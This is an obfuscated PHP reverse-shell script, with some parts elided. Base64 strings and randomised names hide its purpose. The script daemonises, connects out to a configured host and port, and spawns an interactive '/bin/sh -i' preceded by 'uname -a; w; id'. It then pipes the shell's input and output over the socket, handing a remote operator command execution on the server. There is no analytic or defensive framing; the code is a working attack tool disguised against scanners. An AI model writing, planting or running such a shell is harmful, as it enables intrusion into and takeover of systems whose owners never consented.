...
set_time_limit (0);
$kzlc_021321e8 = base64_decode('MS4w');
$hvwg_957b527b = base64_decode('MTI3LjAuMC4x');  $fvot_901555fb = 1335;       $ldgo_377f1423 = 1400;
$ntlc_f540b509 = null;
$kqjc_3925aeaa = null;
$rcgo_2591c98b = base64_decode('dW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1p');
$tedb_1f15fcf5 = 0;
$aunn_ad42f669 = 0;


if (function_exists(base64_decode('cGNudGxfZm9yaw=='))) {
		$qoky_0db3209e = cdav_a615a97f();
	
	if ($qoky_0db3209e == -1) {
		hmol_661507fe(base64_decode('RVJST1I6IENhbid0IGZvcms='));
		exit(1);
	}
	...
	if ($qoky_0db3209e) {
		exit(0);  	}
			...
			if (posix_setsid() == -1) {
		hmol_661507fe(base64_decode('RXJyb3I6IENhbid0IHNldHNpZCgp'));
		exit(1);
	}

	$tedb_1f15fcf5 = 1;
} else {
	hmol_661507fe(base64_decode('V0FSTklORzogRmFpbGVkIHRvIGRhZW1vbmlzZS4gIFRoaXMgaXMgcXVpdGUgY29tbW9uIGFuZCBub3QgZmF0YWwu'));
}

chdir(base64_decode('Lw=='));

umask(0);


$izcg_317d37b0 = fsockopen($hvwg_957b527b, $fvot_901555fb, $yzzc_70106d0d, $linz_809b1abe, 30);
if (!$izcg_317d37b0) {
	hmol_661507fe("$linz_809b1abe ($yzzc_70106d0d)");
	exit(1);
}

$wyzf_6e698426 = array(
   0 => array(base64_decode('cGlwZQ=='), base64_decode('cg==')),     1 => array(base64_decode('cGlwZQ=='), base64_decode('dw==')),     2 => array(base64_decode('cGlwZQ=='), base64_decode('dw=='))   );

$toge_50751408 = proc_open($rcgo_2591c98b, $wyzf_6e698426, $guol_24a9384d);

if (!is_resource($toge_50751408)) {
	hmol_661507fe(base64_decode('RVJST1I6IENhbid0IA=='));
	exit(1);
}

stream_set_blocking($guol_24a9384d[0], 0);
stream_set_blocking($guol_24a9384d[1], 0);
stream_set_blocking($guol_24a9384d[2], 0);
stream_set_blocking($izcg_317d37b0, 0);

hmol_661507fe(base64_decode('U3VjY2Vzc2Z1bGx5'));

while (1) {
		if (feof($izcg_317d37b0)) {
		hmol_661507fe(base64_decode('RVJST1I6IA=='));
		break;
	}

		if (feof($guol_24a9384d[1])) {
		hmol_661507fe(base64_decode('RVJST1I6IGQ='));
		break;
	}

			$apek_c91a2dab = array($izcg_317d37b0, $guol_24a9384d[1], $guol_24a9384d[2]);
	$sibd_8d583239 = stream_select($apek_c91a2dab, $ntlc_f540b509, $kqjc_3925aeaa, null);

			if (in_array($izcg_317d37b0, $apek_c91a2dab)) {
		if ($aunn_ad42f669) hmol_661507fe(base64_decode('U09DSyBSRUFE'));
		$ilew_a43c1b0a = fread($izcg_317d37b0, $ldgo_377f1423);
		if ($aunn_ad42f669) hmol_661507fe("SOCK: $ilew_a43c1b0a");
		fwrite($guol_24a9384d[0], $ilew_a43c1b0a);
	}

			if (in_array($guol_24a9384d[1], $apek_c91a2dab)) {
		if ($aunn_ad42f669) hmol_661507fe(base64_decode('U1RET1VUIFJFQUQ='));
		$ilew_a43c1b0a = fread($guol_24a9384d[1], $ldgo_377f1423);
		if ($aunn_ad42f669) hmol_661507fe("STDOUT: $ilew_a43c1b0a");
		fwrite($izcg_317d37b0, $ilew_a43c1b0a);
	}

			if (in_array($guol_24a9384d[2], $apek_c91a2dab)) {
		if ($aunn_ad42f669) hmol_661507fe(base64_decode('U1RERVJSIFJFQUQ='));
		$ilew_a43c1b0a = fread($guol_24a9384d[2], $ldgo_377f1423);
		if ($aunn_ad42f669) hmol_661507fe("STDERR: $ilew_a43c1b0a");
		fwrite($izcg_317d37b0, $ilew_a43c1b0a);
	}
}

fclose($izcg_317d37b0);
fclose($guol_24a9384d[0]);
fclose($guol_24a9384d[1]);
fclose($guol_24a9384d[2]);
proc_close($toge_50751408);
...
function hmol_661507fe ($ikkv_b45cffe0) {
        if (!$tedb_1f15fcf5) {
                print "$ikkv_b45cffe0\n";
        }
}
